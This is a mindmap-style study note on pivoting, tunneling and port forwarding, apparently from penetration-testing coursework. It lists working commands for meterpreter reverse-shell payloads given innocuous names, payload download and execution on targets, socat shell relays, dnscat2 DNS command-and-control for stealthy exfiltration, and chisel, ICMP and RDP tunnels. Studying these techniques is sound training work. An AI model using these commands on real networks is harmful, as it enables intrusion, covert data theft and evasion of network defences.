---
mindmap-plugin: basic
---
# Pivoting, Tunneling, and Port Forwarding
## Pivot host
- Compromised host that can be used to pivot to a previously unreachable network
- Pivot Host
- Proxy
- Foothold
- Beach Head system
- Jump Host
## Lateral Movement, Pivoting and Tunneling Compared
- Lateral Movement
	- Technique used to further our access to additional host, application, service within a network
	- Moving on the same floor
	- Spread wide, elevating our privileges
- Pivoting
	- Utilizing multiple hosts to cross network boundaries you would not usually have access to.
	- Moving to the next floor, dual-homed networks
	- Delve deeper into the networks, access new environments
- Tunneling
	- Encapsulates network traffic into another protocol and routes traffic through it
	- Subset of pivoting
	- The key here is obfuscation of our actions to avoid detection for as long as possible

## Port Forwarding
- Technique that allows us to redirect a communication from one port to another
- Uses TCP as primary communication layer
- Application layer protocols used for Port Forwarding
	- SSH
		- Local Port Forwarding -L
			- forwards local port on the client to a remote server or service
			- forwards traffic from specific local port to specific remote port 1:1
			- ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
			- ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
		- Dynamic Port Forwarding -D
			- creates a SOCKS proxy
			- allowing multiple applications to forward traffic to various remote destinations dynamically 1:many
			- ssh -D 9050 ubuntu@10.129.202.64
		- Remote Port Forwarding

## Remote/Reverse Port Forwarding
- Steps to reproduce
	- create a payload - 'msfvenom -p windows/x64/meterpreter/reverse_https lhost= InternalIPofPivotHost -f exe -o script.exe LPORT=8080'
	- start MSF mutli/handler - 'msf6 > use exploit/multi/handler'
	- transfer payload to host - 'scp backupscript.exe ubuntu@ipAddressofTarget:~/'
	- start webserver on pivot host - 'python3 -m http.server 8123'
	- download payload - 'Invoke-WebRequest -Uri "http: //172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"'
	- forward - 'ssh -R InternalIPofPivotHost:8080:0.0.0.0:8000 ubuntu@ipAddressofTarget -vN'
	- execute payload
- General
	- opposite to local port forwaring
	- forwards a remote port on the SSH server to a local or remote machine service
	- let's say you want your localhost:8080 server to be accessible to anyone who connects
	- ssh -R 9090:localhost:8080 user@sshserver

## Meterpreter Tunneling & Port Forwarding
- Tunneling
	- create payload - 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080'
	- start MSF mutli/handler - 'msf6 > use exploit/multi/handler'
	- execute script - './backupjob'
- Configuring MSF's SOCKS Proxy
	- configuring - msf6 > use auxiliary/server/socks_proxy
	- confirming - msf6 auxiliary(server/socks_proxy) > jobs
	- adding a line if needed - /etc/proxychains.conf > sock4 127.0.0.1 9050
	- creating routes - meterpreter > run autoroute -s 172.16.5.0/23
- Port Forwaring
	- Creating Local TCP Relay - 'meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19'
	- Reverse Port Forwaring - 'meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18'

## Socat Redirection with a Reverse Shell
- General
	- bidirectional relay tool
	- create pipe sockets between 2 independent network channels
	- no need to use SSH tunneling
- Socat Redirection with a Reverse Shell
	- In a reverse shell, the target machine initiates the connection to the attacker. 
	- Starting listener - 'socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80'
	- Creating payload - 'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080'
	- start MSF mutli/handler - 'msf6 > use exploit/multi/handler'
	- execute script 
- Socat Redirection with a Bind Shell
	- In a bind shell, the target machine (victim) actively opens a network port and waits for an incoming connection from the attacker's machine.
	- The victim machine listens on a specified port, and when the attacker connects, it provides the attacker with a shell (command-line access).
	- creating payload - 'msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443'
	- starting socat bind on victim's host - 'socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443'
	- start MSF mutli/handler - 'msf6 > use exploit/multi/handler'

## SSH for Windows: plink.exe
- General
	- Plink - PuTTY Link
	- Windows command-line SSH tool that comes as a part of the PuTTY package when installed
	- plink -ssh -D 9050 ubuntu@10.129.15.50
- Proxifier
	- Windows-based tol used to start a SOCKS tunnel via the SSH session created
	- allows proxy chaining

## SSH Pivoting with Sshuttle
- General
	- Written in Python, removes the need to configure proxychains
	- only for pivoting over SSH
	- no pivoting over TOR or HTTPS proxy servers
- Running
	- sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
	- creates entry in our iptables to redirect traffic to the 172.16.5.0/23

## Web Server Pivoting with Rpivot
- General
	- Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling
- Running
	- Start our rpivot SOCKS proxy server - 'python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0'
	- transfer rpivot to the target - 'scp -r rpivot ubuntu@IpaddressOfTarget:/home/ubuntu/'
	- run client.py from pivot target - 'python2.7 client.py --server-ip 10.10.14.18 --server-port 9999'

## Port Forwarding with Windows Netsh
- General
	- Netsh is a Windows command-line tool 
	- Finding routes
	- Viewing the firewall configuration
	- Adding proxies
	- Creating port forwarding rules
- Using to Port Forward
	- > netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
	- verify - 'netsh.exe interface portproxy show v4tov4'

## DNS Tunneling with Dnscat2
- General
	- Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. 
	- It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protocol.
	- can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections.
- Running
	- start dnscat2 server - 'sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache'
	- import on Windows - PS> Import-Module .\dnscat2.ps1
	- establish - 'Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd '

## SOCKS5 Tunneling with Chisel
- General
	- Chisel is a TCP/UDP-based tunneling tool written in Go 
	- uses HTTP to transport data that is secured using SSH
	- Chisel can create a client-server tunnel connection in a firewall restricted environment
	- Editing & Confirming proxychains.conf - /etc/proxychains.conf 
- Running
	- transfer to pivot host - 'scp chisel ubuntu@10.129.202.64:~/'
	- start server on pivot host - './chisel server -v -p 1234 --socks5'
	- connect to chisel server - './chisel client -v 10.129.202.64:1234 socks'
- Chisel Reverse Pivot
	- start server - 'sudo ./chisel server --reverse -v -p 1234 --socks5'
	- connect from pivot host - './chisel client -v 10.10.14.17:1234 R:socks'

## ICMP Tunneling with SOCKS
- General
	- Encapsulates your traffic within ICMP packets containing echo requests and responses
	- only work when ping responses are permitted within a firewall network
- Using ptunnel-ng
	- transfer to pivot host - 'scp -r ptunnel-ng ubuntu@10.129.202.64:~/'
	- start ptunnel on pivot host - 'sudo ./ptunnel-ng -r10.129.202.64 -R22'
	- connect from attack host - 'sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22'
	- Tunneling an SSH connection through an ICMP Tunnel - 'ssh -p2222 -lubuntu 127.0.0.1'
	- enabling port forwarding over SSH - 'ssh -D 9050 -p2222 -lubuntu 127.0.0.1'

## RDP and SOCKS Tunneling with SocksOverRDP
- General
	- Great when SSH is not available
	- uses DVC Dynamic Virtual Channels from RDP on Windows
	- using Proxifier as our proxy server
- Running
	- Download binaries for SocksOverRDP and Proxifier
	- loading .dll to a target - 'regsvr32.exe SocksOverRDP-Plugin.dll'
	- now we can establish mstsc.exe connection
	- setup proxifier
